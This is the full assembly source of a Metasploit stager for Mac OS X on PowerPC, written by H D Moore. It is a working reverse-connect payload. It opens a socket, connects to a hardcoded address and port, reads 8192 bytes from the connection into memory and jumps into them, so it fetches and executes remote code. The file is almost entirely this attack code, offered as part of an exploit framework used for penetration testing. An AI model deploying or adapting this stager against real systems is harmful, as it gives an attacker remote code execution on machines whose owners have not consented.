;;
;
;        Name: stager_sock_reverse
;   Qualities: Can Have Nulls
;   Platforms: MacOS X / PPC
;     Authors: H D Moore <hdm [at] metasploit.com>
;     Version: $Revision: 1612 $
;     License:
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        Connects back, reads 8192 bytes, jumps into payload.
;        Socket descriptor is left in r30.
;
;;


.globl _main
.text
_main:
	;; socket
	li		r3, 2
	li		r4, 1
	li		r5, 6
	li		r0, 97
	sc
	xor		r0, r0, r0
	mr		r30, r3

	bl		konnect
	.long 0x00022211
	.long 0x7f000001

konnect:
    mflr	r4
    li		r5, 0x10
    li		r0, 98
    mr		r3, r30
    sc
    xor		r0, r0, r0
    li		r5, 2
		
reader:
	li		r0, 3
	mr		r3, r30
	subi	r4, r1, 8192
	li		r5, 8192
	mtlr	r4
	sc
	xor		r0, r0, r0
	blr
	xor		r0, r0, r0
